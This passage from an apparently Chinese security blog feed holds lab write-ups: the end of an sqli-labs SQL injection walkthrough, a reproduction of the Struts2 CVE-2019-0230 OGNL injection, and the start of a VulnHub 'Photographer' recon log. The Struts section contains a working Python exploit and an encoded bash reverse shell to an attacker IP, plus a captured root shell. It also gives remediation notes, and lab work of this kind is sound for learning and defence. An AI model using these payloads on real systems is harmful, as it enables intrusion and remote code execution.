mysql_fetch_array($result1);</span><br><span class="line">        <span class="keyword">if</span>($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            $insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br><span class="line">            mysql_query($insert);</span><br><span class="line">            <span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;    </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>所以使用如下payload</code></p><blockquote><p>updatexml与extractvalue作用相同</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><br><span class="line">and与or都可以，只是为了闭合单引号</span><br></pre></td></tr></table></figure><p><code>服务器执行的命令如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=&#x27;admin&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27; and users.password=&#x27;&#x27; ORDER BY users.id DESC LIMIT 0,1&quot;</span></span></span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110124944874.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110133641590.png" class><h2 id="0x19-Less-19-POST-基于报错-HTTP请求头-Referer-field"><a href="#0x19-Less-19-POST-基于报错-HTTP请求头-Referer-field" class="headerlink" title="0x19.Less-19 POST 基于报错 HTTP请求头 Referer-field"></a>0x19.Less-19 POST 基于报错 HTTP请求头 Referer-field</h2><p><code>同Less18，只是注入点变为referer</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110125136890.png" class><h2 id="0x20-Less-20-POST-基于报错-cookie注入"><a href="#0x20-Less-20-POST-基于报错-cookie注入" class="headerlink" title="0x20.Less-20 POST 基于报错 cookie注入"></a>0x20.Less-20 POST 基于报错 cookie注入</h2><p><code>注入点为cookie，方法同Less-1</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; order by 3 -- -</span><br><span class="line">uname=admin&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110130119066.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110130152559.png" class><p><strong><em>skip:deciduous_tree:</em></strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Sqli_labs_Page1(basic)&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/categories/Sqli-labs/"/>
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/tags/Sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0230复现</title>
    <link href="https://lunamoore.github.io/2020/12/19/CVE-2019-0230/"/>
    <id>https://lunamoore.github.io/2020/12/19/CVE-2019-0230/</id>
    <published>2020-12-19T08:35:58.000Z</published>
    <updated>2021-06-06T12:53:36.758Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2019-0230-S2-059"><a href="#CVE-2019-0230-S2-059" class="headerlink" title="CVE-2019-0230(S2-059)"></a>CVE-2019-0230(S2-059)</h2><hr><h2 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00.漏洞简述"></a>0x00.漏洞简述</h2><blockquote><p>Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.</p><p>Apache Struts 2.0.0到2.5.20强制执行双重OGNL计算，当对原始用户输入的标记属性进行计算时，可能会导致远程代码执行。</p></blockquote><a id="more"></a><h2 id="0x01-影响"><a href="#0x01-影响" class="headerlink" title="0x01.影响"></a>0x01.影响</h2><ul><li><strong>version: 2.0.0-2.5.20</strong></li><li><strong>solution: apache-struts-upgrade-2_5_22</strong></li></ul><table><thead><tr><th align="center"><strong>Severity</strong></th><th align="center"><strong>CVSS</strong></th><th align="center"><strong>Published</strong></th><th align="center"><strong>Created</strong></th><th align="center"><strong>Added</strong></th><th align="center"><strong>Modified</strong></th></tr></thead><tbody><tr><td align="center">8</td><td align="center">(AV:N/AC:L/Au:N/C:P/I:P/A:P)</td><td align="center">08/17/2020</td><td align="center">08/15/2020</td><td align="center">08/17/2020</td><td align="center">09/21/2020</td></tr></tbody></table><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02.漏洞分析"></a>0x02.漏洞分析</h2><p><span class="exturl" data-url="aHR0cDovL2Jsb2cudG9wc2VjLmNvbS5jbi9zdHJ1dHMyLXMyLTA1OS0lRTYlQkMlOEYlRTYlQjQlOUUlRTUlODglODYlRTYlOUUlOTAv">天融信阿尔法实验室漏洞分析<i class="fa fa-external-link-alt"></i></span></p><p><strong>通过学习可知：此次漏洞需要开启（默认开启）<code>altSyntax</code>功能,只能是在标签<code>id</code>属性中存在表达式,并且参数还可以控制，攻击者通过构造特定的表达式赋值给id参数，传参后导致二次解析可造成远程命令执行漏洞。</strong></p><h2 id="0x03-搭建环境"><a href="#0x03-搭建环境" class="headerlink" title="0x03.搭建环境"></a>0x03.搭建环境</h2><p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3N0cnV0czIvczItMDU5Lw==">本次环境<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04.漏洞复现"></a>0x04.漏洞复现</h2><h3 id="1-访问环境"><a href="#1-访问环境" class="headerlink" title="1.访问环境"></a>1.访问环境</h3><img src="/2020/12/19/CVE-2019-0230/image-20201219162137008.png" class><h3 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h3><p><code>通过构造表达式%25&#123;2*10&#125;执行后发现标签属性id值变成了为10，说明成功执行了表达式并运算2*10，并返回了结果。</code></p><img src="/2020/12/19/CVE-2019-0230/image-20201219161950859.png" class><h3 id="3-构造payload"><a href="#3-构造payload" class="headerlink" title="3.构造payload"></a>3.构造payload</h3><p><code>本次使用bash -i &gt;&amp; /dev/tcp/192.168.1.129/6666 0&gt;&amp;1（需要编码）</code></p><p><span class="exturl" data-url="aHR0cDovL3d3dy5qYWNrc29uLXQuY2EvcnVudGltZS1leGVjLXBheWxvYWRzLmh0bWw=">编码转换地址<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>转换</p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}</p></blockquote><h3 id="4-编写POC"><a href="#4-编写POC" class="headerlink" title="4.编写POC"></a>4.编写POC</h3><p><code>将payload放到对应位置上</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.1.137:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;payload&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line">res2 = requests.post(url, data=data2)</span><br></pre></td></tr></table></figure><h3 id="5-利用"><a href="#5-利用" class="headerlink" title="5.利用"></a>5.利用</h3><p><code>kali监听</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>执行POC get shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.129] from (UNKNOWN) [192.168.1.137] 33258</span><br><span class="line">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@88497928f70b:/usr/src# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@88497928f70b:/usr/src#</span><br></pre></td></tr></table></figure><h2 id="0x05-解决办法"><a href="#0x05-解决办法" class="headerlink" title="0x05.解决办法"></a>0x05.解决办法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">最终的解决方法是为传入的每个值添加适当的验证，并将其用于标记的属性中。  除非为有效的用例真正需要，否则请勿使用强制使用值％以外的属性求值，而使用％&#123;...&#125;或$ &#123;...&#125;语法。 </span><br><span class="line"></span><br><span class="line">通过 升级到Struts 2.5.22，强制双重评估的可能恶意影响将进一步受到限制，并关闭了已报告的攻击媒介，特别是与主动OGNL表达注入保护结合使用时。</span><br><span class="line"></span><br><span class="line">升级到Struts 2.5.22时没有任何问题。（真的吗？？？🙃）</span><br></pre></td></tr></table></figure><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06.总结"></a>0x06.总结</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">强制使用Apache Struts框架时，会对分配给某些标签属性的属性值进行双重评估，例如，id这样就可以传递一个值，该值将在呈现标签属性时再次进行评估。通过精心设计的请求，这可以导致远程执行代码（RCE）。</span><br><span class="line"></span><br><span class="line">仅当在Struts标记属性内强制执行OGNL评估时，此问题才适用，当评估的表达式引用未经攻击的原始输入时，攻击者可以通过设计相应的请求来直接对其进行修改。</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">&lt;s:url var=&quot;url&quot; namespace=&quot;/employee&quot; action=&quot;list&quot;/&gt;&lt;s:a id=&quot;%&#123;skillName&#125;&quot; href=&quot;%&#123;url&#125;&quot;&gt;List available Employees&lt;/s:a&gt;</span><br><span class="line">如果攻击者能够修改skillName请求中的属性，以使原始OGNL表达式skillName无需进一步验证即可传递给该属性，则skillName当作为请求的结果呈现标记时，将评估属性中包含的提供的OGNL表达式。</span><br><span class="line"></span><br><span class="line">从2.0.0开始，Struts会设计使用双重评估的机会，并且正确完成后将成为有用的工具，这最显着的意思是仅在给定表达式中引用经过验证的值。但是，在表达式中引用未经验证的用户输入时，可能会注入恶意代码。在持续的努力中，Struts框架包括缓解措施以限制注入的表达式的影响，但2.5.22之前的Struts仍未解决攻击向量</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;CVE-2019-0230-S2-059&quot;&gt;&lt;a href=&quot;#CVE-2019-0230-S2-059&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-0230(S2-059)&quot;&gt;&lt;/a&gt;CVE-2019-0230(S2-059)&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x00-漏洞简述&quot;&gt;&lt;a href=&quot;#0x00-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.漏洞简述&quot;&gt;&lt;/a&gt;0x00.漏洞简述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.&lt;/p&gt;
&lt;p&gt;Apache Struts 2.0.0到2.5.20强制执行双重OGNL计算，当对原始用户输入的标记属性进行计算时，可能会导致远程代码执行。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Strust2" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Strust2/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="调教" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Strust2" scheme="https://lunamoore.github.io/tags/Strust2/"/>
    
  </entry>
  
  <entry>
    <title>Photographer</title>
    <link href="https://lunamoore.github.io/2020/12/18/Photographer/"/>
    <id>https://lunamoore.github.io/2020/12/18/Photographer/</id>
    <published>2020-12-18T13:00:50.000Z</published>
    <updated>2020-12-19T02:36:15.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote><p>This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.</p></blockquote><a id="more"></a><h2 id="0x01-信息收集，上nmap"><a href="#0x01-信息收集，上nmap" class="headerlink" title="0x01.信息收集，上nmap"></a>0x01.信息收集，上nmap</h2><p><code>可以发现可以发现1为网关，254为物理机，129为kali，那么135就是目标</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/photographer# nmap -sP 192.168.1.0/24 -oN nmap.sP</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-18 06:13 EST</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.135</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: 00:0C:29:2D:43:1A (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.254</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 00:50:56:EB:EE:5F (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.129</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 27.96 seconds</span><br><span class="line">root@JIYE:~/vulnhub/photographer#</span><br></pre></td></tr></table></figure><h2 id="0x02-扫描端口"><a href="#0x02-扫描端口" class="headerlink" title="0x02.扫描端口"></a>0x02.扫描端口</h2><p><code>可以看到开放了80、139、8000、445(SMB)等敏感端口</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/photographer# nmap -sC -sV -sT 192.168.1.135 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-18 06:23 EST</span><br><span class="line">Nmap scan report for 192.168.1.135</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Photographer by v1n1v131r4</span><br><span class="line">139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">8000/tcp open  ssl/http-alt Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-generator: Koken 0.22.24</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: daisa ahomi</span><br><span class="line">MAC Address: 00:0C:29:2D:43:1A (VMware)</span><br><span class="line">Service Info: Host: PHOTOGRAPHER</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 9h40m00s, deviation: 2h53m12s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: photographer</span><br><span class="line">|   NetBIOS computer name: PHOTOGRAPHER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: photographer</span><br><span class="line">|_  System time: 2020-12-18T14:23:58-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-12-18T19:23:57</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 55.84 seconds</span><br><span class="line">root@JIYE:~/vulnhub/photographer#</span><br></pre></td></tr></table></figure><h2 id="0x03-访问80端口"><a href="#0x03-访问80端口" class="headerlink" title="0x03.访问80端口"></a>0x03.访问80端口</h2><p><code>手动爬虫，是一个静态界面，没有什么发现</code></p><img src="/2020/12/18/Photographer/image-20201218192822059.png" class><h2 id="0x04-访问8000端口"><a href="#0x04-访问8000端口" class="headerlink" title="0x04.访问8000端口"></a>0x04.访问8000端口</h2><p><code>手动爬虫，发现CMS为Koken，并且发现一个shell.php不知道肝肾的。</code></p><img src="/2020/12/18/Photographer/image-20201218193224511.png" class><p><code>查看源码，发现CMS版本为0.22.24</code></p><img src="/2020/12/18/Photographer/image-20201218193326700.png" class><h2 id="0x05-Google-exploit"><a href="#0x05-Google-exploit" class="headerlink" title="0x05.Google exploit"></a>0x05.Google exploit</h2><p><code>找到一个文件上传，emmmmmm.刚才爬虫的页面没有上传点，所以猜测需要登入到后台进行上传。</code></p><img src="/2020/12/18/Photographer/image-20201218193515066.png" class><h2 id="0x06-访问admin目录（🙃竟然成功了）"><a href="#0x06-访问admin目录（🙃竟然成功了）" class="headerlink" title="0x06.访问admin目录（🙃竟然成功了）"></a>0x06.访问admin目录（🙃竟然成功了）</h2><p><code>这里其实需要扫一下目录，但是猜到了admin，就不赘述了🌚。</code></p><img src="/2020/12/18/Photographer/image-20201218193934550.png" class><p><code>尝试弱口令登入，可以看到用户名需要是一个邮箱，但不是知道格式，故无法进行爆破。</code></p><img src="/2020/12/18/Photographer/image-20201218194227961.png" class><h2 id="0x07-审查445端口"><a href="#0x07-审查445端口" class="headerlink" title="0x07.审查445端口"></a>0x07.审查445端口</h2><p><code>前面发现了开放了445端口，所以使用enum4linux开始探索一下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# enum4linux -a -o 192.168.1.135</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Dec 18 06:45:16 2020</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.1.135</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... &#x27;&#x27;</span><br><span class="line">Password ......... &#x27;&#x27;</span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.1.135    |</span><br><span class="line"> ===================================================== </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> ============================================= </span><br><span class="line">|    Nbtstat Information for 192.168.1.135    |</span><br><span class="line"> ============================================= </span><br><span class="line">Looking up status of 192.168.1.135</span><br><span class="line">        PHOTOGRAPHER    &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        PHOTOGRAPHER    &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        PHOTOGRAPHER    &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ====================================== </span><br><span class="line">|    Session Check on 192.168.1.135    |</span><br><span class="line"> ====================================== </span><br><span class="line">[+] Server 192.168.1.135 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"> ============================================ </span><br><span class="line">|    Getting domain SID for 192.168.1.135    |</span><br><span class="line"> ============================================ </span><br><span class="line">Domain Name: WORKGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line">[+] Can&#x27;t determine if host is part of domain or part of a workgroup</span><br><span class="line"></span><br><span class="line"> ======================================= </span><br><span class="line">|    OS information on 192.168.1.135    |</span><br><span class="line"> ======================================= </span><br><span class="line">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info for 192.168.1.135 from smbclient: </span><br><span class="line">[+] Got OS info for 192.168.1.135 from srvinfo:</span><br><span class="line">        PHOTOGRAPHER   Wk Sv PrQ Unx NT SNT photographer server (Samba, Ubuntu)</span><br><span class="line">        platform_id     :       500</span><br><span class="line">        os version      :       6.1</span><br><span class="line">        server type     :       0x809a03</span><br><span class="line"></span><br><span class="line"> ============================== </span><br><span class="line">|    Users on 192.168.1.135    |</span><br><span class="line"> 